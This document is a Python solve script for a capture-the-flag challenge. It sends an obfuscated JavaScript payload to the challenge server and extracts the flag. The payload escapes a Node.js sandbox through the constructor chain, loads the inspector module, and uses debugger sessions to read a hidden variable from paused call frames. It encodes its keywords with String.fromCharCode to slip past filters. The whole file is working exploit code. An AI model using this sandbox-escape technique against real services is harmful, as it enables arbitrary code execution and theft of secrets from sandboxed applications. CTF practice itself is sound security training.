#!/usr/bin/env python3
import json
import re
import socket

HOST = "bytecoding.putcyberdays.pl"
PORT = 1337


def cc(s: str) -> str:
    return "String.fromCharCode(" + ",".join(str(ord(ch)) for ch in s) + ")"


def build_payload() -> str:
    return f"""
(()=>{{
  const F=this.constructor.constructor;
  const p=F({cc('return globalThis[\"process\"]')})();
  const r=p[{cc('mainModule')}][{cc('require')}];
  const ins=r({cc('inspector')});
  const s=new ins.Session();
  s.connect();
  const pa={cc('Debugger.paused')};
  const en={cc('Debugger.enable')};
  const rs={cc('Debugger.resume')};
  const ev={cc('Debugger.evaluateOnCallFrame')};
  const sig=new Int32Array(new SharedArrayBuffer(4));
  let out='';
  s.on(pa,(msg)=>{{
    const fs=msg.params.callFrames;
    let i=0;
    const nxt=()=>{{
      if(i>=fs.length){{
        s.post(rs,()=>{{Atomics.store(sig,0,1);Atomics.notify(sig,0);}});
        return;
      }}
      const id=fs[i++].callFrameId;
      s.post(ev,{{callFrameId:id,expression:'typeof flag=="undefined"?"":flag'}},(e,rp)=>{{
        if(!e && rp && rp.result && rp.result.value){{
          out=rp.result.value;
          s.post(rs,()=>{{Atomics.store(sig,0,1);Atomics.notify(sig,0);}});
        }}else{{
          nxt();
        }}
      }});
    }};
    nxt();
  }});
  s.post(en,()=>{{debugger;}});
  Atomics.wait(sig,0,0,900);
  a=out;
}})();
""".strip() + "\n"


def recv_line(sock: socket.socket) -> bytes:
    data = b""
    while not data.endswith(b"\n"):
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def main() -> None:
    payload = build_payload().encode()
    with socket.create_connection((HOST, PORT), timeout=10) as s:
        s.sendall(payload)
        s.shutdown(socket.SHUT_WR)
        raw = recv_line(s)

    obj = json.loads(raw.decode(errors="replace"))
    result = obj.get("result", {})
    flag = result.get("a", "") if isinstance(result, dict) else ""

    if not flag:
        m = re.search(r"putcCTF\{[^}]+\}", raw.decode(errors="replace"))
        if m:
            flag = m.group(0)

    if not flag:
        raise RuntimeError("Flag not found in response")

    print(flag)


if __name__ == "__main__":
    main()
